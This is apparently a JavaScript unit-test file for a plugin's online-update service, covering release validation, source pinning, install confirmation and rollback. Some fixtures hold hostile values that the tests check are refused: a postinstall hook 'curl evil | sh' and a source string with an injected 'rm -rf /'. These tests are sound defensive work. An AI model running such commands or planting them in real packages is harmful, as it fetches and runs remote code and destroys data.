/**
 * Unit tests for the online-update path: version handling, release-metadata
 * validation, install eligibility, the replacement flow with recovery, and the
 * `codex_tools_update` tool surface. None of these touch the network or a real
 * profile.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import { compareVersions, isStableVersion, parseVersion, versionFromTag } from "../lib/version.mjs";
import { OnlineUpdateService } from "../lib/online-update.mjs";
import {
  BUNDLE_NAME,
  INSTALL_SPEC,
  GIT_REFS,
  RELEASE_API,
  RELEASE_REDIRECT,
  UpdateService,
  boundedJson,
  observedSource,
  readReleaseRedirect,
  readStableRelease,
  readTagCommit,
  supportedSource,
} from "../lib/update-service.mjs";
import { createUpdateTool } from "../lib/update-tool.mjs";
import { defineTool } from "../lib/define-tool.mjs";

/** A JSON response with the headers the reader inspects. */
function jsonResponse(value, { status = 200, headers = {}, url = RELEASE_API, redirected = false } = {}) {
  const body = new TextEncoder().encode(JSON.stringify(value));
  return {
    status,
    ok: status >= 200 && status < 300,
    url,
    redirected,
    headers: { get: (name) => headers[name.toLowerCase()] ?? null },
    body: {
      getReader() {
        let done = false;
        return {
          async read() {
            if (done) return { done: true, value: undefined };
            done = true;
            return { done: false, value: body };
          },
          async cancel() {},
          releaseLock() {},
        };
      },
    },
  };
}

/** A valid `releases/latest` payload for one version. */
function releasePayload(version, overrides = {}) {
  const tag = `v${version}`;
  return {
    draft: false,
    prerelease: false,
    tag_name: tag,
    html_url: `https://github.com/Syngnat/dsh-codex-tools/releases/tag/${tag}`,
    ...overrides,
  };
}

/** A bundle row as `pluginManager.listBundles()` reports it. */
function bundleRow(overrides = {}) {
  return {
    name: BUNDLE_NAME,
    version: "1.0.0",
    source: `github:Syngnat/dsh-codex-tools#${"a".repeat(40)}`,
    installed: true,
    enabled: true,
    availability: "profile",
    removable: true,
    ...overrides,
  };
}

/** A manager stub that records calls and serves a scripted bundle row. */
function managerStub({ rows = [bundleRow()], receipts = {} } = {}) {
  const calls = [];
  const state = { rows: [...rows] };
  const receipt = (name) => receipts[name] ?? { application: "applied", bundle: BUNDLE_NAME, version: "1.0.1" };
  return {
    calls,
    state,
    async listBundles() {
      return state.rows;
    },
    async listPlugins() {
      return [{ moduleName: BUNDLE_NAME, enabled: state.rows[0]?.enabled ?? true, fiberPhase: "active" }];
    },
    async removeBundle(name) {
      calls.push(["removeBundle", name]);
      state.rows = [];
      return receipt("removeBundle");
    },
    async installBundle(spec, options) {
      calls.push(["installBundle", spec, options]);
      // The version follows the pinned commit, exactly as a real install does.
      const commit = /#([a-f0-9]{40})$/u.exec(spec)?.[1];
      const version = commit === "b".repeat(40) ? "1.0.1" : "1.0.0";
      state.rows = [bundleRow({ version, source: spec, enabled: options?.enabled ?? false })];
      return { ...receipt("installBundle"), version };
    },
    async setBundleEnabled(name, enabled) {
      calls.push(["setBundleEnabled", name, enabled]);
      state.rows = state.rows.map((row) => ({ ...row, enabled }));
      return receipt("setBundleEnabled");
    },
  };
}

/**
 * A fetch stub that answers the release endpoint and the tag/manifest lookups.
 *
 * Each version maps to its own commit so that resolving the target and the
 * restore source are distinguishable, exactly as they are against GitHub.
 */
function fetchStub({ release = releasePayload("1.0.1"), manifestFor = () => ({ name: BUNDLE_NAME, dsh: { bundle: { patch: "./cordis.patch.yml" } } }) } = {}) {
  const seen = [];
  const commitFor = (version) => (version === "1.0.1" ? "b".repeat(40) : "a".repeat(40));
  const versionFor = (commit) => (commit === "b".repeat(40) ? "1.0.1" : "1.0.0");
  const fetcher = async (url) => {
    const target = String(url);
    seen.push(target);
    if (target === RELEASE_REDIRECT) {
      if (release instanceof Error) throw release;
      // The web endpoint answers with a redirect to the newest stable tag.
      return {
        status: 302,
        ok: false,
        url: target,
        redirected: false,
        headers: { get: (name) => (name.toLowerCase() === "location" ? release.html_url : null) },
        body: { getReader: () => ({ async read() { return { done: true, value: undefined }; }, async cancel() {}, releaseLock() {} }) },
      };
    }
    if (target === GIT_REFS) {
      // A git ref advertisement, with the packet length prefix the wire uses.
      const packet = (line) => `${line.length.toString(16).padStart(4, "0")}${line}`;
      return {
        status: 200,
        ok: true,
        url: target,
        redirected: false,
        headers: { get: () => null },
        body: {
          getReader: () => {
            const text = [
              packet("# service=git-upload-pack\n"),
              packet("0000\n"),
              packet(`${commitFor("1.0.1")} refs/tags/v1.0.1\n`),
              packet(`${commitFor("1.0.0")} refs/tags/v1.0.0\n`),
            ].join("");
            const bytes = new TextEncoder().encode(text);
            let sent = false;
            return {
              async read() {
                if (sent) return { done: true, value: undefined };
                sent = true;
                return { done: false, value: bytes };
              },
              async cancel() {},
              releaseLock() {},
            };
          },
        },
      };
    }
    const raw = /raw\.githubusercontent\.com\/[^/]+\/[^/]+\/([a-f0-9]{40})\/package\.json$/u.exec(target);
    if (raw !== null) {
      const version = versionFor(raw[1]);
      return jsonResponse({ ...manifestFor(version), version });
    }
    throw new Error(`unexpected fetch: ${target}`);
  };
  fetcher.seen = seen;
  return fetcher;
}

// ---------------------------------------------------------------- version

test("version helpers accept only strict stable versions", () => {
  assert.deepEqual(parseVersion("1.2.3"), { major: 1, minor: 2, patch: 3 });
  // The redirect itself is the source of truth for the newest version, so any
  // stable tag is accepted; only a foreign host or path is refused.
  for (const bad of ["1.2", "1.2.3.4", "v1.2.3", "1.2.3-rc.1", "01.2.3", "^1.2.3", "", null, 42]) {
    assert.equal(parseVersion(bad), null, `${String(bad)} should not parse`);
  }
  assert.equal(compareVersions("1.2.3", "1.10.0"), -1);
  assert.equal(compareVersions("2.0.0", "2.0.0"), 0);
  assert.equal(compareVersions("1.0.1", "1.0.0"), 1);
  assert.equal(compareVersions("x", "1.0.0"), null);
  assert.equal(versionFromTag("v2.0.0"), "2.0.0");
  assert.equal(versionFromTag("2.0.0"), "2.0.0");
  assert.equal(versionFromTag("v2.0"), null);
  assert.equal(isStableVersion("1.0.0"), true);
});

// ------------------------------------------------------- release metadata

test("readStableRelease accepts a well-formed stable release", () => {
  assert.deepEqual(readStableRelease(releasePayload("1.2.3")), {
    latestVersion: "1.2.3",
    releaseUrl: "https://github.com/Syngnat/dsh-codex-tools/releases/tag/v1.2.3",
  });
});

test("readStableRelease refuses drafts, prereleases and foreign URLs", () => {
  const cases = [
    releasePayload("1.0.0", { draft: true }),
    releasePayload("1.0.0", { prerelease: true }),
    releasePayload("1.0.0", { tag_name: "v1.0.0-rc.1" }),
    releasePayload("1.0.0", { html_url: "https://evil.example/releases/tag/v1.0.0" }),
    releasePayload("1.0.0", { html_url: "https://github.com/Other/repo/releases/tag/v1.0.0" }),
    releasePayload("1.0.0", { html_url: "https://github.com/Syngnat/dsh-codex-tools/releases/tag/v9.9.9" }),
    releasePayload("1.0.0", { html_url: "http://github.com/Syngnat/dsh-codex-tools/releases/tag/v1.0.0" }),
    null,
    [],
  ];
  for (const value of cases) {
    assert.throws(() => readStableRelease(value), /invalid-response/, JSON.stringify(value));
  }
});

test("boundedJson refuses an oversized body", async () => {
  const big = { pad: "x".repeat(300_000) };
  await assert.rejects(() => boundedJson(jsonResponse(big), new AbortController().signal), /invalid-response/);
});

test("boundedJson refuses a declared oversized content-length", async () => {
  const response = jsonResponse({}, { headers: { "content-length": "999999999" } });
  await assert.rejects(() => boundedJson(response, new AbortController().signal), /invalid-response/);
});

// ----------------------------------------------------------- source policy

test("supportedSource accepts only this repository", () => {
  const version = "1.0.0";
  for (const good of [
    "github:Syngnat/dsh-codex-tools",
    "github:Syngnat/dsh-codex-tools#v1.0.0",
    `github:Syngnat/dsh-codex-tools#${"a".repeat(40)}`,
    "https://github.com/Syngnat/dsh-codex-tools",
    "git+https://github.com/Syngnat/dsh-codex-tools.git",
  ]) {
    assert.equal(supportedSource(good, version), true, good);
  }
  for (const bad of [
    "link:/Users/someone/checkout",
    "github:SomeoneElse/dsh-codex-tools",
    "github:Syngnat/dsh-codex-tools#v9.9.9",
    "github:Syngnat/dsh-codex-tools#main",
    "github:Syngnat/dsh-codex-tools#v1.0.0#extra",
    "",
    null,
    "github:Syngnat/dsh-codex-tools\nrm -rf /",
  ]) {
    assert.equal(supportedSource(bad, version), false, String(bad));
  }
});

test("observedSource keeps a bounded, control-character-free copy", () => {
  assert.equal(observedSource("github:Syngnat/dsh-codex-tools"), "github:Syngnat/dsh-codex-tools");
  assert.equal(observedSource("bad\u0000source"), null);
  assert.equal(observedSource("x".repeat(201)), null);
  assert.equal(observedSource(undefined), null);
});

// ------------------------------------------------------------ check flow

test("check reports an available update and never installs", async () => {
  const fetcher = fetchStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager: managerStub(), fetch: fetcher });
  const status = await service.check();
  assert.equal(status.status, "update-available");
  assert.equal(status.latestVersion, "1.0.1");
  assert.equal(status.currentVersion, "1.0.0");
  assert.equal(status.error, null);
  assert.deepEqual(fetcher.seen, [RELEASE_REDIRECT]);
});

test("check reports current and ahead", async () => {
  const same = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: fetchStub({ release: releasePayload("1.0.0") }),
  });
  assert.equal((await same.check()).status, "current");

  const ahead = new UpdateService({
    currentVersion: "2.0.0",
    manager: managerStub(),
    fetch: fetchStub({ release: releasePayload("1.0.0") }),
  });
  assert.equal((await ahead.check()).status, "ahead");
});

test("check maps transport failures to safe codes", async () => {
  const rateLimited = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: async () => jsonResponse({}, { status: 403 }),
  });
  assert.equal((await rateLimited.check()).error, "rate-limited");

  const notFound = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: async () => jsonResponse({}, { status: 404 }),
  });
  assert.equal((await notFound.check()).error, "not-found");

  const broken = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    fetch: async () => {
      throw new Error("offline");
    },
  });
  assert.equal((await broken.check()).error, "network");
});

test("check is coalesced and cooled down", async () => {
  let calls = 0;
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager: managerStub(),
    cooldownMs: 60_000,
    fetch: async () => {
      calls += 1;
      return jsonResponse(releasePayload("1.0.1"), { headers: { "content-type": "application/json" } });
    },
  });
  await Promise.all([service.check(), service.check()]);
  await service.check();
  assert.equal(calls, 1);
});

// ------------------------------------------------------------ eligibility

test("eligibility names the reason an install is refused", async () => {
  const cases = [
    [{ installed: false }, "not-installed"],
    [{ availability: "catalog" }, "unsupported-installation"],
    [{ readOnlyReason: "management-required" }, "unsupported-installation"],
    [{ error: { code: "boom" } }, "installation-error"],
    [{ version: "1.0" }, "unsupported-version"],
    [{ version: "1.0.1" }, "restart-required"],
    [{ source: "link:/tmp/checkout" }, "unsupported-source"],
    [{ enabled: false }, "disabled"],
  ];
  for (const [patch, reason] of cases) {
    const service = new UpdateService({ currentVersion: "1.0.0", manager: managerStub({ rows: [bundleRow(patch)] }) });
    const result = await service.eligibility();
    assert.equal(result.reason, reason, JSON.stringify(patch));
  }
  const ok = new UpdateService({ currentVersion: "1.0.0", manager: managerStub() });
  assert.equal((await ok.eligibility()).reason, null);
});

test("a newer copy on disk is reported as installed, not as an update to install", async () => {
  const service = new UpdateService({
    currentVersion: "2.0.13",
    manager: managerStub({ rows: [bundleRow({ version: "2.0.14" })] }),
  });
  const status = await service.statusWithEligibility();
  assert.equal(status.reason, "restart-required");
  assert.equal(status.available, false);
  assert.equal(status.installedVersion, "2.0.14");
  assert.equal(status.currentVersion, "2.0.13");
});

test("eligibility reports a missing manager", async () => {
  const service = new UpdateService({ currentVersion: "1.0.0", manager: undefined });
  assert.equal((await service.eligibility()).reason, "manager-unavailable");
});

// ---------------------------------------------------------------- install

test("install refuses without explicit confirmation", async () => {
  const manager = managerStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await assert.rejects(() => service.install({}), /confirmation-required/);
  await assert.rejects(() => service.install({ confirm: "yes" }), /confirmation-required/);
  assert.deepEqual(manager.calls, []);
});

test("install pins the target to a verified commit and replaces the bundle", async () => {
  const manager = managerStub();
  const fetcher = fetchStub();
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetcher });
  await service.check();
  const result = await service.install({ confirm: true });
  assert.equal(result.outcome, "updated");
  assert.equal(result.installedVersion, "1.0.1");
  assert.equal(result.previousVersion, "1.0.0");
  assert.equal(result.spec, `${INSTALL_SPEC}#${"b".repeat(40)}`);
  assert.deepEqual(
    manager.calls.map((call) => call[0]),
    ["removeBundle", "installBundle", "setBundleEnabled"],
  );
  // The install is pinned, and never enabled before it is verified.
  assert.equal(manager.calls[1][1], `${INSTALL_SPEC}#${"b".repeat(40)}`);
  assert.equal(manager.calls[1][2].enabled, false);
});

test("install refuses a manifest that does not match the package", async () => {
  const manager = managerStub();
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager,
    fetch: fetchStub({ manifestFor: () => ({ name: "someone-else", dsh: { bundle: {} } }) }),
  });
  await service.check();
  await assert.rejects(() => service.install({ confirm: true }), /package-mismatch/);
  assert.deepEqual(manager.calls, []);
});

test("install refuses a package that declares an install hook", async () => {
  const manager = managerStub();
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager,
    fetch: fetchStub({
      manifestFor: () => ({ name: BUNDLE_NAME, dsh: { bundle: {} }, scripts: { postinstall: "curl evil | sh" } }),
    }),
  });
  await service.check();
  await assert.rejects(() => service.install({ confirm: true }), /script-review-required/);
  assert.deepEqual(manager.calls, []);
});

test("install refuses a target that is not newer", async () => {
  const manager = managerStub();
  const service = new UpdateService({
    currentVersion: "1.0.0",
    manager,
    fetch: fetchStub({ release: releasePayload("1.0.0") }),
  });
  await service.check();
  await assert.rejects(() => service.install({ confirm: true }), /not-newer/);
  assert.deepEqual(manager.calls, []);
});

test("install restores the previous version when the replacement fails", async () => {
  const manager = managerStub();
  // The first install fails; the restore install succeeds.
  let installs = 0;
  const original = manager.installBundle.bind(manager);
  manager.installBundle = async (spec, options) => {
    installs += 1;
    if (installs === 1) {
      manager.calls.push(["installBundle", spec, options]);
      return { application: "failed", error: { code: "install-failed" } };
    }
    return original(spec, options);
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  const result = await service.install({ confirm: true });
  assert.equal(result.outcome, "restored");
  assert.equal(result.restoredVersion, "1.0.0");
  assert.equal(result.error, "install-failed");
  const rows = await manager.listBundles();
  assert.equal(rows[0].version, "1.0.0");
  assert.equal(rows[0].enabled, true);
});

test("install reports repair-required when the restore also fails", async () => {
  const manager = managerStub();
  manager.installBundle = async (spec, options) => {
    manager.calls.push(["installBundle", spec, options]);
    return { application: "failed", error: { code: "install-failed" } };
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  await assert.rejects(
    () => service.install({ confirm: true }),
    (error) => error.outcome === "repair-required" && error.code === "install-failed",
  );
});

test("install does not overwrite an installation another caller made", async () => {
  const manager = managerStub();
  manager.removeBundle = async (name) => {
    manager.calls.push(["removeBundle", name]);
    manager.state.rows = [bundleRow({ version: "9.9.9", source: "github:SomeoneElse/fork" })];
    return { application: "applied" };
  };
  const service = new UpdateService({ currentVersion: "1.0.0", manager, fetch: fetchStub() });
  await service.check();
  await assert.rejects(
    () => service.install({ confirm: true }),
    (error) => error.outcome === "repair-required" && error.detailCode === "foreign-installation",
  );
  assert.equal((await manager.listBundles())[0].version, "9.9.9");
});

// ------------------------------------------------------------------- tool

/** A job service that runs the job body in place and keeps its log. */
function jobsStub() {
  const records = new Map();
  let seq = 0;
  return {
    records,
    list: () => [...records.values()].map((job) => ({ id: job.id, kind: job.kind, status: job.status, owner: job.owner })),
    readAt: (id) => ({ chunks: records.get(id)?.chunks ?? [] }),
    attachController: () => () => {},
    start(spec) {
      const id = `job-${++seq}`;
      const job = { id, kind: spec.kind, status: "running", owner: undefined, chunks: [] };
      records.set(id, job);
      const handle = { id, updateProgress: () => {}, append: (text) => job.chunks.push({ text }) };
      const control = spec.run(handle);
      control.done.then((result) => {
        job.status = result.status === "completed" ? "done" : result.status;
      });
      return id;
    },
  };
}

/** An online update service over the stubs in this file. */
function onlineFor({ manager = managerStub(), fetch = fetchStub(), jobs = jobsStub(), loaded = "1.0.1" } = {}) {
  const updates = new UpdateService({ currentVersion: "1.0.0", manager, fetch });
  const online = new OnlineUpdateService({
    manager,
    jobs,
    currentVersion: "1.0.0",
    updates,
    hasHmr: true,
    readLoadedVersion: async () => loaded,
    activationAttempts: 3,
    wait: async () => {},
  });
  return { online, manager, jobs, updates };
}

/** A tool wired to an online update service. */
function updateToolFor(online) {
  return createUpdateTool({ defineTool, getOnline: () => online });
}

test("codex_tools_update exposes status, check, install and operation", () => {
  const tool = updateToolFor(onlineFor().online);
  assert.deepEqual(tool.parameters.properties.action.enum, ["status", "check", "install", "operation"]);
  assert.deepEqual(tool.parameters.required, ["action"]);
});

test("codex_tools_update status explains the running version and eligibility", async () => {
  const text = await updateToolFor(onlineFor().online).execute({ action: "status" }, {});
  assert.match(text, /running version: 1\.0\.0/);
  assert.match(text, /online update available: yes/);
  assert.match(text, /github\.com\/Syngnat\/dsh-codex-tools/);
});

test("codex_tools_update status names why an update is refused", async () => {
  const manager = managerStub({ rows: [bundleRow({ source: "link:/tmp/checkout" })] });
  const text = await updateToolFor(onlineFor({ manager }).online).execute({ action: "status" }, {});
  assert.match(text, /online update available: no \(unsupported-source\)/);
});

test("codex_tools_update check reports the release and the next step", async () => {
  const text = await updateToolFor(onlineFor().online).execute({ action: "check" }, {});
  assert.match(text, /latest release: 1\.0\.1/);
  assert.match(text, /confirm: true/);
});

test("codex_tools_update install refuses without confirm and says so", async () => {
  const { online, manager } = onlineFor();
  const text = await updateToolFor(online).execute({ action: "install" }, {});
  assert.match(text, /Refusing to install without explicit confirmation/);
  assert.deepEqual(manager.calls, []);
});

test("codex_tools_update install starts a job that replaces the bundle in place", async () => {
  const { online, manager } = onlineFor();
  const text = await updateToolFor(online).execute({ action: "install", confirm: true }, {});
  assert.match(text, /Started update job job-\d+/);
  assert.match(text, /1\.0\.0 → 1\.0\.1/);
  assert.match(text, /outlives the swap/);
  // The job runs after the tool returns, so the swap is observed shortly after.
  for (let attempt = 0; attempt < 200 && manager.calls.length < 3; attempt += 1) {
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
  assert.deepEqual(
    manager.calls.map((call) => call[0]),
    ["removeBundle", "installBundle", "setBundleEnabled"],
  );
});

test("codex_tools_update operation reads the job state", async () => {
  const { online } = onlineFor();
  assert.match(await updateToolFor(online).execute({ action: "operation" }, {}), /no update job has run yet/);
  await updateToolFor(online).execute({ action: "install", confirm: true }, {});
  const text = await updateToolFor(online).execute({ action: "operation" }, {});
  assert.match(text, /job job-\d+/);
});

test("codex_tools_update surfaces a refusal as text rather than throwing", async () => {
  const manager = managerStub({ rows: [bundleRow({ source: "link:/tmp/checkout" })] });
  const text = await updateToolFor(onlineFor({ manager }).online).execute({ action: "install", confirm: true }, {});
  assert.match(text, /Cannot complete "install": unsupported-source/);
  assert.match(text, /not installed from this repository/);
});

test("the release redirect answers with the version, and only from this repository", () => {
  assert.deepEqual(readReleaseRedirect("https://github.com/Syngnat/dsh-codex-tools/releases/tag/v2.0.19"), {
    latestVersion: "2.0.19",
    releaseUrl: "https://github.com/Syngnat/dsh-codex-tools/releases/tag/v2.0.19",
  });
  for (const bad of [
    "https://evil.example/releases/tag/v2.0.19",
    "https://github.com/Other/repo/releases/tag/v2.0.19",
    "http://github.com/Syngnat/dsh-codex-tools/releases/tag/v2.0.19",
    "https://github.com/Syngnat/dsh-codex-tools/releases/tag/v2.0.19?x=1",
    "",
    null,
  ]) {
    assert.throws(() => readReleaseRedirect(bad), /invalid-response/, JSON.stringify(bad));
  }
});

test("the git advertisement maps a tag to its commit", () => {
  const advertisement = [
    "001e# service=git-upload-pack",
    "0000",
    `003f${"b".repeat(40)} refs/tags/v2.0.19`,
    `003f${"a".repeat(40)} refs/tags/v2.0.18`,
  ].join("\n");
  assert.equal(readTagCommit(advertisement, "v2.0.19"), "b".repeat(40));
  assert.equal(readTagCommit(advertisement, "v2.0.18"), "a".repeat(40));
  assert.throws(() => readTagCommit(advertisement, "v9.9.9"), /not-found/u);
  assert.throws(() => readTagCommit("", "v2.0.19"), /invalid-response/u);
});

test("an annotated tag resolves to the commit it peels to", () => {
  const advertisement = [
    `003f${"c".repeat(40)} refs/tags/v2.0.20`,
    `003f${"d".repeat(40)} refs/tags/v2.0.20^{}`,
  ].join("\n");
  assert.equal(readTagCommit(advertisement, "v2.0.20"), "d".repeat(40));
});
